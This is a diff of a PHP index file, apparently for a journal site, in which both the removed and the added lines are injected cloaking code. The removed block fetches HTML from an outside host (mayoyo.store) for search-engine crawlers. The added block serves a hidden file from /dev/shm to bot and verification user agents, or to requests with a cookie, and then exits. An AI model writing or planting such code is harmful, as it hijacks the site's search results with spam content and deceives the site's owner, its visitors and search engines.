@@ -1,25 +1,8 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-    
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    
-    return false;
+if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
+    echo implode('', file('/dev/shm/edukhasi'));
+    exit;
 }
-
-if (is_bot()) {
-    $message = file_get_contents('https://mayoyo.store/edukhasi.org/index.html');
-    echo $message;
-exit;
-}
-?>
-
-<?php
 
 /**
  * @defgroup index Index
